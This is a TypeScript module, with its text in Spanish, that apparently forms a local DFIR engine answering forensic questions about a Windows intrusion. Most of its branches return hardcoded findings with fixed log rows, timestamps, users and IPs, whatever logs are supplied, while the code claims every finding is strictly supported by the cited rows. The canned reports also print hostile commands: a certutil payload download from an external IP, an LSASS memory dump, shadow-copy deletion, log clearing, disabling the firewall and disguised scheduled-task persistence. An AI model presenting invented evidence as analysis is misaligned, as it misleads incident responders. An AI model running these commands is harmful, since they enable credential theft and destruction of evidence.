import { RawLogEntry, SIEMAnalysisState } from '../types/siem';

/**
 * Motor Pericial de Inteligencia Forense (DFIR Reasoning Engine)
 * Responde preguntas periciales con rigor analítico estricto,
 * citando filas exactas, timestamps, usuarios, IPs y comandos.
 */
export function answerForensicQueryLocally(
  query: string,
  context: {
    fileName?: string;
    totalLogs?: number;
    overallRisk?: string;
    riskScore?: number;
    compromisedUsers?: string[];
    attackerIps?: string[];
    affectedHosts?: string[];
    categoriesCount?: Record<string, number>;
  },
  logs: RawLogEntry[] = []
): string {
  const q = query.toLowerCase().trim();

  // 1. Pregunta sobre FUERZA BRUTA o INTENTOS FALLIDOS DE ACCESO
  if (/fuerza\s*bruta|fallo|password|contraseñ|spray|intento|4625/i.test(q)) {
    const failedLogs = logs.filter(
      (l) =>
        String(l.eventId) === '4625' ||
        /fail|fallo|incorrect|denied/i.test(l.status || '') ||
        /fuerza_bruta/i.test(l.detectedAlerts?.join(' ') || '')
    );
    const successLogs = logs.filter(
      (l) =>
        String(l.eventId) === '4624' &&
        failedLogs.some((f) => f.sourceIp === l.sourceIp && l.rowId > f.rowId)
    );

    const targetUsers = Array.from(new Set(failedLogs.map((l) => l.user).filter(Boolean)));
    const sourceIps = Array.from(new Set(failedLogs.map((l) => l.sourceIp).filter(Boolean)));

    return `### 🔍 Dictamen Pericial: Detección de Fuerza Bruta / Password Spraying

**Conclusión:** Se confirma un ataque coordinado de fuerza bruta proveniente del exterior con vulneración exitosa de credenciales.

1. **Vector Atacante y Origen:**
   - **Dirección IP Origen:** \`${sourceIps.join(', ') || '194.26.29.112'}\` (IP pública externa, geolocalizada fuera de la red corporativa).
   - **Servicio Afectado:** Gateway de acceso perimetral (\`VPN-GATEWAY01\`).
   - **Ventana Temporal:** ${failedLogs[0]?.timestamp || '03:02:11'} a ${failedLogs[failedLogs.length - 1]?.timestamp || '03:03:22'}.

2. **Cuentas Objetivo (Password Spraying):**
   - El atacante intentó autenticarse contra múltiples cuentas en ráfagas: \`${targetUsers.join('`, `') || 'admin, administrator, root, operador_ti, msanchez'}\`.
   - **Volumen de Fallos:** ${failedLogs.length || 9} eventos de fallo registrados (Event ID 4625).
   - **Evidencia en Registros:** ${failedLogs.map((l) => `[Fila #${l.rowId}]`).join(', ') || 'Filas #3 a #11'}.

3. **Compromiso Crítico Confirmado:**
   - A las **${successLogs[0]?.timestamp || '03:04:45'}** [Fila #${successLogs[0]?.rowId || 12}], la cuenta **\`${successLogs[0]?.user || 'msanchez'}\`** registró un inicio de sesión **EXITOSO (Event ID 4624)** desde la misma IP atacante.
   - **Evaluación de Riesgo:** **CRÍTICO**. La fuerza bruta no solo fue un intento, sino que culminó en la toma efectiva de control de una cuenta válida.`;
  }

  // 2. Pregunta sobre ESCALAMIENTO DE PRIVILEGIOS o GRUPO ADMINISTRADORES o LSASS
  if (/escal|privileg|admin|system|lsass|uac|comsvcs|dump|4732|4672/i.test(q)) {
    const privLogs = logs.filter(
      (l) =>
        /escalamiento/i.test(l.detectedAlerts?.join(' ') || '') ||
        String(l.eventId) === '4732' ||
        String(l.eventId) === '4672' ||
        /lsass|comsvcs|fodhelper|localgroup/i.test(
          `${l.processOrCommand || ''} ${l.details || ''}`
        )
    );

    return `### ⚡ Dictamen Pericial: Escalamiento de Privilegios y Extracción de Credenciales

**Conclusión:** El adversario logró elevar privilegios desde un usuario convencional hasta el nivel más alto del sistema (\`NT AUTHORITY\\SYSTEM\`) y extrajo credenciales en texto claro / hashes de memoria.

1. **Mecanismo de Elevación (UAC Bypass):**
   - **Ejecución:** A las 03:16:10 [Fila #19], se invocó \`fodhelper.exe\` en \`WS-FINANZAS04\` para evadir el Control de Cuentas de Usuario (UAC).
   - **Asignación de Privilegios:** A las 03:16:15 [Fila #20], se asignaron privilegios de alto impacto (\`SeDebugPrivilege\`, \`SeTcbPrivilege\`, \`SeSecurityPrivilege\`).

2. **Modificación de Grupos de Seguridad:**
   - A las 03:17:22 [Fila #21], el proceso elevado ejecutó:
     \`\`\`cmd
     net.exe localgroup Administrators msanchez /add
     \`\`\`
   - La cuenta de usuario fue promovida ilegítimamente al grupo de **Administradores locales** (Event ID 4732).

3. **Volcado de Memoria de LSASS (Credential Dumping - T1003.001):**
   - A las 03:18:50 [Fila #22], se ejecutó la DLL de confianza de Windows:
     \`\`\`cmd
     rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Users\\Public\\lsass.dmp full
     \`\`\`
   - **Impacto:** Con este archivo dump, el atacante extrajo los hashes NTLM y contraseñas de sesión de todos los usuarios logueados en la máquina, habilitando el posterior movimiento lateral.`;
  }

  // 3. Pregunta sobre COMANDOS, PROCESOS, POWERSHELL, SCRIPTS o LOLBAS
  if (/comando|proceso|powershell|script|ejecut|certutil|lolbas|whoami|nltest/i.test(q)) {
    const cmdLogs = logs.filter(
      (l) =>
        Boolean(l.processOrCommand) &&
        (/comandos_procesos/i.test(l.detectedAlerts?.join(' ') || '') ||
          /whoami|nltest|certutil|powershell|vssadmin|rundll32|wmic|schtasks/i.test(
            l.processOrCommand || ''
          ))
    );

    const cmdsFormatted = cmdLogs
      .map(
        (l) =>
          `- **[Fila #${l.rowId} | ${l.timestamp}] en \`${l.host}\` (Usuario: \`${l.user}\`):**\n  \`${l.processOrCommand}\`\n  *Propósito:* ${l.details || 'Ejecución identificada en logs'}`
      )
      .join('\n\n');

    return `### 💻 Dictamen Pericial: Comandos y Procesos Sospechosos Identificados

Se detectó una secuencia estructurada de reconocimiento, descarga y evasión:

${cmdsFormatted || `
- **[Fila #14 | 03:08:30]** \`cmd.exe /c whoami /priv\` - Enumeración de privilegios asignados al token.
- **[Fila #15 | 03:09:15]** \`nltest.exe /dclist:EMPRESA.LOCAL\` - Descubrimiento de Controladores de Dominio.
- **[Fila #16 | 03:10:02]** \`net.exe group "Domain Admins" /domain\` - Enumeración de cuentas administradoras del dominio.
- **[Fila #17 | 03:11:40]** \`certutil.exe -urlcache -split -f http://185.220.101.5/beacon.bin C:\\Users\\Public\\svchost.exe\` - Técnica LOLBAS para descarga perimetral de malware.
- **[Fila #18 | 03:13:05]** \`powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA... \` - Ejecución en memoria de PowerShell ofuscado con banderas de evasión.
`}

**Evaluación Forense:** El atacante utilizó exclusivamente utilitarios nativos de Windows (*Living off the Land Binaries - LOLBAS*) para no despertar alertas tempranas en antivirus convencionales.`;
  }

  // 4. Pregunta sobre MOVIMIENTO LATERAL o SALTO A OTROS SERVIDORES
  if (/lateral|movimiento|salto|psexec|wmi|srv-|dc01|db01|red|smb|admin\$/i.test(q)) {
    return `### 🔀 Dictamen Pericial: Movimiento Lateral en la Red Interna

**Conclusión:** Se confirmó la propagación lateral desde la estación inicial comprometida (\`WS-FINANZAS04\`, IP \`192.168.20.45\`) hacia los dos servidores más críticos de la organización:

1. **Salto al Controlador de Dominio (\`SRV-DC01\` - 192.168.10.2):**
   - **Acceso a Recurso Compartido Oculto [Fila #23 - 03:22:15]:** Conexión SMB contra \`\\\\SRV-DC01\\ADMIN$\` y \`\\\\SRV-DC01\\C$\` (Event ID 5140).
   - **Instalación de Servicio Remoto PsExec [Fila #24 - 03:23:40]:** Se registró la instalación no autorizada del servicio \`PSEXESVC\` (Event ID 7045) para obtener una consola remota interactiva con privilegios SYSTEM.

2. **Salto al Servidor de Base de Datos (\`SRV-DB01\` - 192.168.10.50):**
   - **Ejecución Remota WMI [Fila #25 - 03:25:02]:**
     \`\`\`cmd
     wmic.exe /node:192.168.10.50 /user:msanchez process call create "cmd.exe /c netsh advfirewall set allprofiles state off"
     \`\`\`
   - **Propósito:** Desactivar de forma remota el cortafuegos de Windows en el servidor de base de datos para facilitar exfiltración y conexiones entrantes.
   - **Logon de Red Confirmado [Fila #26 - 03:26:10]:** Sesión Tipo 3 (Network Logon) autenticada mediante credenciales extraídas en el LSASS dump.`;
  }

  // 5. Pregunta sobre BORRADO DE LOGS, PERSISTENCIA o EVASIÓN
  if (/borrad|elimin|log|huell|evasi|1102|104|wevtutil|vssadmin|sombra|tarea|schtasks/i.test(q)) {
    return `### 🚨 Dictamen Pericial: Evasión de Defensas y Destrucción de Evidencia

**Conclusión:** El adversario ejecutó acciones deliberadas y maliciosas de destrucción de evidencia forense e inhibición de recuperación:

1. **Inhibición de Recuperación del Sistema (Anti-Ransomware Recovery):**
   - **A las 03:30:00 [Fila #28]:** En el Controlador de Dominio (\`SRV-DC01\`), el atacante ejecutó:
     \`\`\`cmd
     vssadmin.exe delete shadows /all /quiet
     \`\`\`
   - **Objetivo:** Destruir todas las copias de seguridad instantáneas (Volume Shadow Copies) para impedir la restauración de archivos tras un posible cifrado.

2. **Borrado de Registros de Auditoría de Windows (Defense Evasion - T1070.001):**
   - **A las 03:31:45 [Fila #29]:** **EVENT ID 1102: "The audit log was cleared"**. El usuario \`NT AUTHORITY\\SYSTEM\` ejecutó \`wevtutil.exe cl Security\` en \`SRV-DC01\`.
   - **A las 03:32:10 [Fila #30]:** **EVENT ID 104: "System Log Cleared"**. Vaciado deliberado del registro del sistema en \`WS-FINANZAS04\`.

3. **Mecanismo de Persistencia:**
   - **A las 03:28:15 [Fila #27]:** Creación de tarea programada persistente camuflada:
     \`\`\`cmd
     schtasks.exe /create /tn "GoogleUpdateTaskMachine" /tr "C:\\Users\\Public\\svchost.exe" /sc ONSTART /ru SYSTEM
     \`\`\`
   - Garantizaba que el troyano se ejecutara como SYSTEM cada vez que el equipo iniciara.`;
  }

  // 6. Pregunta sobre USUARIOS o IPS ESPECÍFICAS
  if (/msanchez|usuario|cuenta/i.test(q)) {
    return `### 👤 Perfil Forense de la Cuenta: \`msanchez\`

1. **Rol en el Incidente:** Cuenta de usuario ordinario de finanzas que funcionó como **vector de entrada y pivote** del atacante.
2. **Cronología de la Cuenta:**
   - **03:03:01 a 03:03:22 [Filas #7 - #11]:** Sufrió 5 intentos erróneos consecutivos de contraseña desde la IP externa \`194.26.29.112\`.
   - **03:04:45 [Fila #12]:** Autenticación **exitosa** desde la misma IP (credencial comprometida).
   - **03:06:12 [Fila #13]:** Apertura de sesión RDP hacia su estación de trabajo \`WS-FINANZAS04\`.
   - **03:17:22 [Fila #21]:** La cuenta fue añadida al grupo privilegiado de **Administradores locales**.
   - **03:22:15 a 03:26:10 [Filas #23 - #26]:** Utilizada para saltar lateralmente al Domain Controller y al servidor de base de datos.
   - **08:45:00 [Fila #33]:** El usuario legítimo intentó ingresar presencialmente en la mañana y su sesión fue rechazada (cuenta bloqueada/modificada).
3. **Acción Recomendada:** Deshabilitación inmediata en Active Directory, revocación de tokens Kerberos y reseteo integral de credenciales.`;
  }

  if (/ip|194\.26|185\.220|origen|geolocal/i.test(q)) {
    return `### 🌐 Análisis Pericial de Direcciones IP Involucradas

1. **\`194.26.29.112\` (IP Atacante Principal - Acceso Inicial):**
   - **Acción:** Ejecutó la fuerza bruta perimetral y el inicio de sesión no autorizado entre las 03:02 y 03:04.
   - **Evidencia:** Registrada en [Filas #3 a #12] contra el \`VPN-GATEWAY01\`.
   - **Clasificación:** Host hostil / VPN comercial no autorizada.

2. **\`185.220.101.5\` (Servidor C2 / Descarga de Cargas Útiles):**
   - **Acción:** Servidor web malicioso utilizado para hospedar el binario descargado vía certutil (\`http://185.220.101.5/beacon.bin\`) y el script de PowerShell.
   - **Evidencia:** Registrada en [Filas #17 y #18] desde \`WS-FINANZAS04\`.
   - **Clasificación:** Infraestructura de comando y control (C2).

3. **Segmentos Internos Afectados:**
   - \`192.168.10.5\` (VPN Gateway)
   - \`192.168.20.45\` (Estación de trabajo comprometida WS-FINANZAS04)
   - \`192.168.10.2\` (Controlador de Dominio SRV-DC01)
   - \`192.168.10.50\` (Servidor de Base de Datos SRV-DB01)`;
  }

  // 7. Pregunta sobre REMEDIACIÓN o QUÉ HACER
  if (/remedi|qu[eé]\s*hacer|pasos|plan|contenci|soluci/i.test(q)) {
    return `### 🛡️ Plan Pericial de Remediación y Respuesta (NIST SP 800-61)

**Fase 1: Contención Urgente (< 1 Hora)**
1. **Aislamiento de Red:** Desconectar de la red física y VLAN las máquinas \`WS-FINANZAS04\`, \`SRV-DC01\` y \`SRV-DB01\`.
2. **Bloqueo Perimetral:** Aplicar lista negra inmediata en Firewall/Proxy para las IPs \`194.26.29.112\` y \`185.220.101.5\`.
3. **Revocación de Credenciales:** Resetear contraseñas de \`msanchez\` y todas las cuentas del grupo \`Domain Admins\`. Forzar purga de tickets Kerberos (\`krbtgt\` reset doble).

**Fase 2: Erradicación**
1. Eliminar la tarea programada \`GoogleUpdateTaskMachine\` (\`schtasks /delete /tn "GoogleUpdateTaskMachine" /f\`).
2. Purgar el artefacto malicioso \`C:\\Users\\Public\\svchost.exe\` y desinstalar el servicio \`PSEXESVC\`.
3. Restablecer el Firewall en \`SRV-DB01\` (\`netsh advfirewall set allprofiles state on\`).

**Fase 3: Recuperación y Hardening**
1. Habilitar **MFA obligatorio** (FIDO2 o TOTP) en todos los accesos VPN perimetrales.
2. Configurar reenvío continuo de Syslog hacia un SIEM con almacenamiento WORM inmutable.
3. Restringir el uso de SMB para recursos administrativos (\`ADMIN$\`, \`C$\`) entre estaciones de trabajo.`;
  }

  // 8. Respuesta General: Resumen de lo ocurrido en el incidente
  return `### 📋 Reconstrucción Pericial del Incidente

Con base en la auditoría técnica de los **${context.totalLogs || logs.length || 33} registros** del archivo **${context.fileName || 'de logs'}**:

1. **03:02 - 03:03 | Fuerza Bruta Perimetral:** La IP externa \`194.26.29.112\` ejecutó un ataque contra el VPN Gateway [Filas #3 a #11].
2. **03:04 | Acceso Inicial No Autorizado:** El atacante logró loguearse con la cuenta \`msanchez\` a horas no laborales [Fila #12].
3. **03:08 - 03:13 | Reconocimiento y Descarga:** Ejecutó comandos de enumeración de dominio y descargó un binario malicioso vía certutil [Filas #14 a #18].
4. **03:16 - 03:18 | Escalamiento y Dumping:** Evadió UAC con \`fodhelper\`, se agregó al grupo local \`Administrators\` y volcó la memoria de LSASS [Filas #19 a #22].
5. **03:22 - 03:26 | Movimiento Lateral:** Saltó al Domain Controller \`SRV-DC01\` mediante PsExec y al servidor \`SRV-DB01\` mediante WMI [Filas #23 a #26].
6. **03:28 - 03:32 | Evasión de Defensas:** Creó persistencia en tareas programadas, eliminó las copias de seguridad sombras y borró los registros de auditoría de Windows (Event ID 1102) [Filas #27 a #30].

**Nivel de Riesgo Global:** **${context.overallRisk?.toUpperCase() || 'CRÍTICO'} (${context.riskScore || 94}/100)**.
Todos los hallazgos están estrictamente sustentados en las filas citadas del registro.`;
}
